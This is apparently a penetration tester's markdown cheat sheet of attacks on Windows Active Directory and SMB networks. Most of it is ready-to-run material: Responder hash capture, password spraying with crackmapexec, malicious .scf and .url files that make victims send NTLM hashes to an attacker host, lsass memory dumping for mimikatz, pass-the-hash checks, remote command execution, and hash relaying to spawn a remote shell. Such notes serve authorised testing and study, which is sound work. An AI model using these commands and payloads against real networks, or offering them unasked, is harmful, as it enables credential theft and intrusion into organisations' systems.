## Getting Creds
* `responder -I eth0 -wrf` _Start responder on eth0. Listen for netbios, and wpad_
* `crackmapexec smb {ip} -u {users.txt} -p {password}` _spray all user accounts in users.txt with a single popular password_

```
[Shell]
Command=1
IconFile=\\{attacker ip}\whatever.ico
[Taskbar]
Command=ToggleDesktop
```
_Example index.scf file that can force any machine that views a share to send hash to attackers responder_

```
[InternetShortcut]
URL=file://{attacker ip}/@whatever
```
_Example .url file that when clicked will send hash to attackers responder_

* `smbclient \\\\{ip}\\{share name} -U {domain}/{user}` _connect to smb share with valid creds_
* `put /{path}/index.scf ./index.scf` _upload malicous scf file to root of connected smb share_
* [kerberoast](https://room362.com/post/2016/kerberoast-pt1/) _stealing crackable tickets from AD using kerberoasting. htb machine [Active](https://0xrick.github.io/hack-the-box/active/) is an example of this_
* `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump “<lsass pid> lsass.dmp full”` _Dump the lsass process to a file so it can be transfered to attacked for mimikatz.  Useful after forcing clear text lsass creds.  See tutorial page_
* [lsassy](https://github.com/Hackndo/lsassy) _Remotely dump secrets from lsass process_

## Enumeration
* `crackmapexec smb {ip range} -u {username} -p {password}` _scan an ip or range with valid creds to see where it's an admin or at least a valid user_
* `crackmapexec smb {ip range} -u {username} -p {password} --shares` _enumerate shares that user hass access to_
* `/usr/share/responder/tools/RunFinger.py -i {ip/mask}` _scan for machines with smb signing off so hashes can be passed instead of cracked_
* `crackmapexec smb {ip range} -u {username} -H {hash} --local-auth` _Check an ip range for access using a local admin account and its uncracked hash.  SMB singing must be disabled on the target_
* [bloodhound](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/) _Use to map a path to domain admin.  [unofficial docker image](https://github.com/belane/docker-bloodhound)_

## Remote Commands
* `crackmapexec smb {ip range} -u {username} -p {password} -x {cmd}`  _run command on remote machine using valid creds_
* `/usr/share/responder/tools/MultiRelay.py -t {ip} -u ALL` _Responder must be running with smb and http off.  This will listen for admin hashes and try to relay them to the specified ip to spawn a remote shell.  SMB signing must be disabled on the target [some instructions here](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)_
